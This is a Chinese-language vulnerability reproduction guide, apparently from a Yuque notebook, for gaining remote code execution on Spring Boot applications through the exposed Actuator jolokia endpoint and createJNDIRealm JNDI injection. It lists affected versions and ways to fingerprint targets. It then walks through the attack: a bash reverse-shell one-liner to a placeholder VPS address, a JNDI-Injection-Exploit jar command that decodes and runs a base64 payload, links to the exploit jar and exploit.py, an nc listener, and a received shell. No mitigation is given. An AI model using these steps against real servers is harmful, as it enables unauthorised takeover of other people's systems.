# Spring Boot jolokia Realm JNDI远程代码执行漏洞

# 一、漏洞简介
Actuator 是 Spring Boot 提供的服务监控和管理中间件。当 Spring Boot 应用程序运行时，它会自动将多个端点注册到路由进程中。当配置`jolokia/list`接口，且访问`jolokia/list`接口存在`type=MBeanFactory`和`createJNDIRealm`关键字时，存在`Spring jolokia Realm JNDI`远程代码执行漏洞。

## 二、影响版本	
+ Spring Boot < 1.5 默认未授权访问所有端点
+ Spring Boot >= 1.5 默认只允许访问/health和/info端点，但是此安全性通常被应用程序开发人员禁用

Spring Boot 1.x版本端点在根URL下注册。

![1698576714277-71a73073-04b0-4a3c-966d-bba57e4944b9.png](./img/lD151wknq39V0bAQ/1698576714277-71a73073-04b0-4a3c-966d-bba57e4944b9-347569.png)

Spring Boot 2.x版本端点移动到/actuator/路径。

![1698576733486-183446b7-1066-4c12-9181-e16cb0df831d.png](./img/lD151wknq39V0bAQ/1698576733486-183446b7-1066-4c12-9181-e16cb0df831d-027623.png)

# 三、系统特征
1. 网站图片文件是一个绿色的树叶。



![1698576979706-f936398d-5236-4f6d-a518-474733394877.png](./img/lD151wknq39V0bAQ/1698576979706-f936398d-5236-4f6d-a518-474733394877-560639.png)

2. 特有的报错信息。

![1698576999220-8efdd199-4150-4cab-80c5-6d727340149c.png](./img/lD151wknq39V0bAQ/1698576999220-8efdd199-4150-4cab-80c5-6d727340149c-322932.png)

3. 存在`/jolokia/list`接口

![1698577033216-3270b605-0da8-421d-97f8-cfc8baa55626.png](./img/lD151wknq39V0bAQ/1698577033216-3270b605-0da8-421d-97f8-cfc8baa55626-943670.png)

# 四、漏洞复现
1. 确认存在`type=MBeanFactory`和`createJNDIRealm`关键字时，存在Spring jolokia Realm JNDI远程代码执行漏洞

![1698577944981-d1cd174f-c5f9-4361-9b31-2c765873cdf8.png](./img/lD151wknq39V0bAQ/1698577944981-d1cd174f-c5f9-4361-9b31-2c765873cdf8-560420.png)

![1698578013109-7e54d965-932c-4f56-80c0-9d1d0fd17a52.png](./img/lD151wknq39V0bAQ/1698578013109-7e54d965-932c-4f56-80c0-9d1d0fd17a52-816439.png)

2. 生成反弹shell命令

```plain
/bin/bash -i >& /dev/tcp/xx.xx.xx.xx/7777 0>&1
```

2. 将上述反弹shell命令base64编码后替换到下述`command`字符处，`vps`处填写为`vps ip`

```plain
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,command}|{base64,-d}|{bash,-i}" -A "vps"
```

3. 将`JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar`上传到vps中运行上述命令

[JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar](https://www.yuque.com/attachments/yuque/0/2024/jar/1622799/1709222253187-2cb205fa-03a1-4c83-b20d-15ef97031929.jar)

![1698577387014-60a6f59b-e08b-46ae-8cd0-2adbd24dc7dc.png](./img/lD151wknq39V0bAQ/1698577387014-60a6f59b-e08b-46ae-8cd0-2adbd24dc7dc-960558.png)

4. 修改 expliot 中的 url 和 rmi 地址

[exploit.py](https://www.yuque.com/attachments/yuque/0/2024/py/1622799/1709222253494-e1aea116-ca7d-4438-bcaa-3c9b5188ff09.py)

![1698577518599-c06c9711-aace-4078-a8f8-ec67e5d0e4a8.png](./img/lD151wknq39V0bAQ/1698577518599-c06c9711-aace-4078-a8f8-ec67e5d0e4a8-478851.png)

![1698577467774-16a487a1-d095-4973-ac7e-9320596f094f.png](./img/lD151wknq39V0bAQ/1698577467774-16a487a1-d095-4973-ac7e-9320596f094f-552345.png)

4. nc 监听端口

```plain
nc -lvvp 7777
```

![1698577554789-09ca2754-5c88-4810-8889-e9c6b9fbe0d1.png](./img/lD151wknq39V0bAQ/1698577554789-09ca2754-5c88-4810-8889-e9c6b9fbe0d1-869854.png)

5. 执行exp收到反弹shell

```plain
python3 exploit.py
```

![1698577713992-325f1991-81a1-4e32-9088-607fffc268ef.png](./img/lD151wknq39V0bAQ/1698577713992-325f1991-81a1-4e32-9088-607fffc268ef-793843.png)

![1698577666540-851adfb8-d788-44e5-807b-276e44ee32a4.png](./img/lD151wknq39V0bAQ/1698577666540-851adfb8-d788-44e5-807b-276e44ee32a4-019562.png)



> 更新: 2024-02-29 23:57:33  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/asne342gkdk4cde8>